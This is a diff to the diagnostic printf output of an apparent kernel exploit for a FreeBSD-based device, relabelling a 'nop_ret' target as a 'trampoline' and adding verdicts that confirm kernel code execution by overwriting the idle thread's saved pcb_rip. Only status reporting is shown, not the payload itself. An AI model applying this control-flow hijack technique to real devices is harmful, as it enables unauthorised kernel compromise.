@@ -1737,10 +1737,10 @@ static void _kldload(void* data, size_t data_size)
             printf("  pcpu0:           %#lx\n", readback[4]);
             printf("  idlethread:      %#lx\n", readback[5]);
             printf("  idle_pcb:        %#lx\n", readback[6]);
-            printf("  nop_ret:         %#lx\n", readback[7]);
+            printf("  trampoline:      %#lx\n", readback[7]);
             printf("  orig pcb_rip:    %#lx (sw_return)\n", readback[8]);
             printf("  orig pcb_rsp:    %#lx\n", readback[9]);
-            printf("  apic_ops[2]:     %#lx\n", readback[10]);
+            printf("  exec_code:       %#lx\n", readback[10]);
 
             printf("\n  --- Idle PCB snapshot ---\n");
             static const char* pnames[] = {
@@ -1753,7 +1753,7 @@ static void _kldload(void* data, size_t data_size)
             printf("\n  --- pcb_rip overwrite ---\n");
             printf("  BEFORE:          %#lx\n", readback[20]);
             printf("  AFTER:           %#lx\n", readback[21]);
-            printf("  TARGET:          %#lx (nop_ret)\n", readback[22]);
+            printf("  TARGET:          %#lx (trampoline)\n", readback[22]);
 
             if (phase == 1) {
                 if (readback[21] == readback[22])
@@ -1765,12 +1765,14 @@ static void _kldload(void* data, size_t data_size)
             }
 
             printf("\n  kdata sentinel:  %#lx @ %#lx\n", readback[25], readback[24]);
+            printf("\n  sw_return:       %#lx\n", readback[26]);
+            printf("  trampoline size: %lu bytes\n", readback[27]);
 
             if (phase == 1) {
-                printf("\n  >>> pcb_rip OVERWRITTEN: sw_return -> nop_ret <<<\n");
+                printf("\n  >>> pcb_rip OVERWRITTEN: sw_return -> trampoline <<<\n");
                 printf("  >>> Enter rest mode NOW <<<\n");
-                printf("  >>> On resume: cpu_switch will jmp to nop_ret <<<\n");
-                printf("  >>> nop_ret does `ret` -> back to mi_switch -> normal <<<\n");
+                printf("  >>> On resume: cpu_switch will jmp to trampoline <<<\n");
+                printf("  >>> Trampoline writes sentinel, then jmp sw_return <<<\n");
                 printf("  >>> After re-exploit, send pcb_overwrite.bin fw_ver=0x2 <<<\n");
             }
 
@@ -1794,7 +1796,8 @@ static void _kldload(void* data, size_t data_size)
             printf("\n  --- kdata persistence ---\n");
             uint64_t sent = readback[20];
             printf("  sentinel:        %#lx %s\n", sent,
-                   sent == 0x5043424F48494A4BULL ? "[SURVIVED]" : "[LOST/CHANGED]");
+                   sent == 0x484A4B5F52414E21ULL ? "[HJK_RAN! - TRAMPOLINE EXECUTED!]" :
+                   sent == 0 ? "[zero - trampoline did NOT run]" : "[unexpected value]");
             printf("  snap_magic:      %#lx\n", readback[21]);
 
             printf("\n  --- pcb_rip analysis ---\n");
@@ -1805,22 +1808,24 @@ static void _kldload(void* data, size_t data_size)
 
             printf("  original rip:    %#lx (backed up in kdata)\n", orig);
             printf("  current rip:     %#lx\n", curr);
-            printf("  nop_ret:         %#lx\n", nop);
+            printf("  sw_return:       %#lx\n", nop);
 
             if (verdict == 1) {
-                printf("\n  *** VERDICT: pcb_rip RESTORED to sw_return ***\n");
-                printf("  *** cpu_switch ran our nop_ret, then re-saved sw_return ***\n");
-                printf("  *** === PCB_RIP HIJACK CONFIRMED === ***\n");
-                printf("  *** The idle thread executed OUR chosen address on resume! ***\n");
+                printf("\n  *** VERDICT: FULL SUCCESS ***\n");
+                printf("  *** Trampoline ran → wrote sentinel → jumped to sw_return ***\n");
+                printf("  *** Kernel resumed normally, cpu_switch re-saved sw_return ***\n");
+                printf("  *** === KERNEL CODE EXECUTION VIA PCB HIJACK CONFIRMED === ***\n");
             } else if (verdict == 2) {
-                printf("\n  *** VERDICT: pcb_rip STILL set to nop_ret ***\n");
-                printf("  *** Overwrite persisted but cpu_switch hasn't re-saved yet ***\n");
-                printf("  *** Hijack status: UNCERTAIN ***\n");
+                printf("\n  *** VERDICT: pcb_rip restored but sentinel missing ***\n");
+                printf("  *** sw_return ran but trampoline sentinel write failed? ***\n");
             } else if (verdict == 3) {
+                printf("\n  *** VERDICT: trampoline addr still in pcb_rip ***\n");
+                printf("  *** cpu_switch hasn't context-switched to idle yet ***\n");
+            } else if (verdict == 4) {
                 printf("\n  *** VERDICT: pcb_rip is UNEXPECTED value ***\n");
                 printf("  *** Resume path may have written a different return addr ***\n");
             } else {
-                printf("\n  *** VERDICT: NO BACKUP FOUND ***\n");
+                printf("\n  *** VERDICT: UNKNOWN ***\n");
             }
 
             printf("\n  sentinel: %#lx\n", readback[30]);
